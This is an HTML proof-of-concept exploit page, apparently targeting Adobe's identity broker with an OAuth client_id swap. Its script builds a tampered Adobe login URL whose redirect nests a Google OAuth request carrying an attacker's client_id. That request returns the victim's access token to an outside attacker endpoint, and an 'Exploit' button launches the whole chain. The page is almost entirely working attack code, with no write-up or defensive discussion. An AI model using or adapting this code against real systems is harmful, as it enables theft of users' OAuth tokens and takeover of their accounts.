<!DOCTYPE html>
<html>
<head>
  <title>Adobe OAuth ClientID Swap PoC</title>
  <style>
    body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
    button { padding:10px 20px; margin-top:20px; background:#4caf50; color:white; border:none; cursor:pointer; }
    #log { margin-top:20px; background:#000; color:#0f0; padding:10px;
           font-family:monospace; height:200px; width:95%; overflow-y:auto; }
  </style>
</head>
<body>
  <h2>Adobe OAuth ClientID Swap PoC</h2>
  <button onclick="launch()">Exploit</button>
  <div id="log"></div>

<script>
function log(msg){
  document.getElementById("log").innerHTML += msg + "<br>";
  let box=document.getElementById("log"); box.scrollTop=box.scrollHeight;
}

// Build attacker's Google OAuth request
function buildAttackGoogleOAuth(){
  let attackerClient = "50787447880-lej9pu0gkn41t1cacqcisjessmcrt9bf.apps.googleusercontent.com"; // attacker client_id
  let attackerRedirect = "https://poc-coop.com/store.html"; // attacker endpoint
  let scope = "openid profile email";

  return "https://accounts.google.com/o/oauth2/v2/auth?" +
    "client_id=" + encodeURIComponent(attackerClient) +
    "&redirect_uri=" + encodeURIComponent(attackerRedirect) +
    "&response_type=token" +
    "&scope=" + encodeURIComponent(scope);
}

function launch(){
  let attackOAuth = buildAttackGoogleOAuth();

  // Craft tampered Adobe broker URL
  let tamperedAdobeURL =
    "https://auth-light.identity.adobe.com/?" +
    "client_id=clio-playground-web" +
    "&response_type=token" +
    "&redirect_uri=" + encodeURIComponent(attackOAuth) +
    "&environment=prod&locale=en_US&popup=true";

  log("â–¶ Opening tampered Adobe URL...");
  window.open(tamperedAdobeURL, "_blank"); // open in new tab
}
</script>
</body>
</html>
